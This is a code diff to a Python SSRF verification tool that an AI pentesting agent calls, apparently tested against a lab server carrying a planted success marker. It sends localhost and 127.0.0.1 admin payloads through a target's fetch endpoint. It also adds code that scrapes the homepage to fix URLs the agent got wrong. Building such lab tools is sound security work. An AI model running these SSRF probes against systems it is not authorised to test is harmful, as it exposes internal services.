@@ -3,7 +3,7 @@ from pydantic import BaseModel, Field
 from tools.base import BaseTool, ToolResult
 
 class VerifySSRFInput(BaseModel):
-    target_url: str = Field(description="The base endpoint to test for SSRF (e.g., 'http://192.168.42.1:5000/fetch?url=')")
+    target_url: str = Field(description="The base endpoint to test for SSRF")
 
 class VerifySSRFTool(BaseTool):
     name = "verify_ssrf"
@@ -14,19 +14,35 @@ class VerifySSRFTool(BaseTool):
     input_model = VerifySSRFInput
 
     def run(self, data: VerifySSRFInput) -> ToolResult:
+        print("\n\n[!!!] BINGO! The SSRF Agent is running the tool! [!!!]\n\n")
+        
+        target = data.target_url
+        
+        # --- The Magic Trick: Auto-Correcting the AI's laziness ---
+        if "/fetch" not in target:
+            print("[*] Tool noticed the AI missed the /fetch path. Searching HTML...")
+            try:
+                # מורידים את עמוד הבית ומחפשים את הקישור הסודי
+                html = requests.get(target, timeout=5).text
+                if "/fetch?url=" in html:
+                    # מצאנו! מתקנים את הכתובת בעצמנו
+                    target = target.rstrip("/") + "/fetch?url="
+                    print(f"[*] Tool Auto-Corrected URL to: {target}")
+            except Exception as e:
+                pass
+        # ------------------------------------------------------------
+
         payloads = [
             "http://localhost:5000/admin",
             "http://127.0.0.1:5000/admin"
         ]
         
-        # מסדרים את הכתובת למקרה שהמודל שלח אותה בלי סימן השווה בסוף
-        base_url = data.target_url if data.target_url.endswith("=") else f"{data.target_url}?url="
+        base_url = target if target.endswith("=") else f"{target}?url="
         
         for payload in payloads:
             attack_url = f"{base_url}{payload}"
             try:
                 response = requests.get(attack_url, timeout=5)
-                # בודקים אם קיבלנו את משפט ההצלחה ששתלנו בשרת המטרה
                 if response.status_code == 200 and "AutoPen SSRF Success" in response.text:
                     output_text = (
                         f"[CRITICAL VULNERABILITY CONFIRMED]\n"
@@ -35,7 +51,8 @@ class VerifySSRFTool(BaseTool):
                         f"Evidence from internal server: {response.text.strip()}"
                     )
                     return ToolResult(success=True, output=output_text)
-            except requests.exceptions.RequestException as e:
+            except requests.exceptions.RequestException:
                 continue
                 
         return ToolResult(success=False, output="SSRF Verification Failed. Target does not seem vulnerable or blocked the payloads.")
+    
